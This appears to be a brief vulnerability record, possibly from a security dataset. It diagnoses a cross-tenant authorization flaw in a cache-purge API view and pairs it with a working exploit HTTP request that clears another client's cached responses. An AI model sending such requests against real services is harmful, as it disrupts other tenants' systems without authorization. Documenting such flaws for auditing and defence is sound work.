diagnosis: CacheTagPurgeView invalidates cache tags constructed using tag_slug from the URL path. Any logged-in user can supply tag slugs corresponding to other enterprise clients or shared product catalog partitions, repeatedly clearing cached API responses across tenants.
exploit_request:
POST /api/cache/tags/enterprise-client-alpha/invalidate/ HTTP/1.1
Host: api.edgegateway.net
Cookie: sessionid=valid_user_cookie
Content-Length: 0
